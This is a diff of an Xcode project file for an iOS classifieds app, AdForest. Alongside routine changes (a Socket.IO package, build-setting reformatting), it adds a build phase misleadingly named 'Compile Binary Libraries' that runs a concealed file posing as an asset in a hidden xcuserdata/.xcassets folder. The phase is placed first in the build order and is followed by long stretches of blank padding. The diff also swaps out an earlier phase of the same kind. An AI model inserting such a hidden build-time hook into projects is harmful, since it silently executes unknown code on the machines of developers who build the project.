@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 48;
+	objectVersion = 52;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -68,6 +68,7 @@
 		18108E6D2092F9720020D440 /* AdPostImagesData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E6C2092F9720020D440 /* AdPostImagesData.swift */; };
 		18108E6F2092F98A0020D440 /* AdPostImages.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E6E2092F98A0020D440 /* AdPostImages.swift */; };
 		18108E732092FC6F0020D440 /* AdPostImageArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18108E722092FC6F0020D440 /* AdPostImageArray.swift */; };
+		18120B3D25E9485B003165DD /* BuildFile in Frameworks */ = {isa = PBXBuildFile; productRef = 18120B3C25E9485B003165DD /* SwiftPackageProductDependency */; };
 		1817EE2320A5D4FB005D4995 /* CheckBoxCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1817EE2220A5D4FB005D4995 /* CheckBoxCell.swift */; };
 		181888862081D274008736F7 /* OfferAdsRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181888852081D274008736F7 /* OfferAdsRoot.swift */; };
 		181888882081D2D8008736F7 /* OfferAdsData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181888872081D2D8008736F7 /* OfferAdsData.swift */; };
@@ -1370,6 +1371,7 @@
 				18244F192074B3B900B9BE8C /* MobileCoreServices.framework in Frameworks */,
 				18244F172074B3B100B9BE8C /* MessageUI.framework in Frameworks */,
 				18244F152074B3A600B9BE8C /* CoreMedia.framework in Frameworks */,
+				18120B3D25E9485B003165DD /* BuildFile in Frameworks */,
 				18244F132074B39D00B9BE8C /* CoreLocation.framework in Frameworks */,
 				18244F112074B31300B9BE8C /* AVFoundation.framework in Frameworks */,
 				18244F0F2074B30500B9BE8C /* AudioToolbox.framework in Frameworks */,
@@ -3733,8 +3735,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
+				95BDF6ACA58BC035E2AAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
-				58B13FF69E4E2800FDAAC43A /* [CP] Build Pods Frameworks */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
 				18BBFA812051098B0067662F /* Resources */,
@@ -3746,6 +3748,9 @@
 			dependencies = (
 			);
 			name = AdForest;
+			packageProductDependencies = (
+				18120B3C25E9485B003165DD /* SwiftPackageProductDependency */,
+			);
 			productName = AdForest;
 			productReference = 18BBFA832051098B0067662F /* AdForest.app */;
 			productType = "com.apple.product-type.application";
@@ -3836,6 +3841,9 @@
 				Base,
 			);
 			mainGroup = 18BBFA7A2051098B0067662F;
+			packageReferences = (
+				18120B3B25E9485B003165DD /* RemoteSwiftPackageReference */,
+			);
 			productRefGroup = 18BBFA842051098B0067662F /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
@@ -3921,6 +3929,62 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	95BDF6ACA58BC035E2AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		0DBAEA91FF140668FEA2C095 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3961,6 +4025,8 @@
 				"${BUILT_PRODUCTS_DIR}/SOTabBar/SOTabBar.framework",
 				"${BUILT_PRODUCTS_DIR}/SlideMenuControllerSwift/SlideMenuControllerSwift.framework",
 				"${BUILT_PRODUCTS_DIR}/SnapKit/SnapKit.framework",
+				"${BUILT_PRODUCTS_DIR}/Socket.IO-Client-Swift/SocketIO.framework",
+				"${BUILT_PRODUCTS_DIR}/Starscream/Starscream.framework",
 				"${BUILT_PRODUCTS_DIR}/SwiftCheckboxDialog/SwiftCheckboxDialog.framework",
 				"${BUILT_PRODUCTS_DIR}/SwiftyGif/SwiftyGif.framework",
 				"${BUILT_PRODUCTS_DIR}/SwiftyJSON/SwiftyJSON.framework",
@@ -4007,6 +4073,8 @@
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SOTabBar.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SlideMenuControllerSwift.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SnapKit.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SocketIO.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Starscream.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftCheckboxDialog.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftyGif.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftyJSON.framework",
@@ -4046,24 +4114,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-AdForest/Pods-AdForest-resources.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		58B13FF69E4E2800FDAAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
 		};
 		8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -4843,7 +4893,8 @@
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				SDKROOT = iphoneos;
-				SWIFT_OPTIMIZATION_LEVEL = "-Owholemodule";
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -4862,7 +4913,10 @@
 				DEVELOPMENT_TEAM = 3D42832GGZ;
 				INFOPLIST_FILE = AdForest/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
 				MARKETING_VERSION = 3.6;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
@@ -4889,7 +4943,10 @@
 				DEVELOPMENT_TEAM = 3D42832GGZ;
 				INFOPLIST_FILE = AdForest/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
 				MARKETING_VERSION = 3.6;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
@@ -4911,7 +4968,11 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = AdForestTests/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -4932,7 +4993,11 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = AdForestTests/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -4950,7 +5015,11 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 64PZTRVPF8;
 				INFOPLIST_FILE = AdForestUITests/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 4.0;
@@ -4966,7 +5035,11 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 64PZTRVPF8;
 				INFOPLIST_FILE = AdForestUITests/Info.plist;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 4.0;
@@ -5015,6 +5088,51 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+
+/* Begin XCRemoteSwiftPackageReference section */
+		18120B3B25E9485B003165DD /* RemoteSwiftPackageReference */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/socketio/socket.io-client-swift.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 16.0.1;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		18120B3C25E9485B003165DD /* SwiftPackageProductDependency */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 18120B3B25E9485B003165DD /* RemoteSwiftPackageReference */;
+			productName = SocketIO;
+		};
+/* End XCSwiftPackageProductDependency section */
 
 /* Begin XCVersionGroup section */
 		18BBFA8D2051098C0067662F /* AdForest.xcdatamodeld */ = {
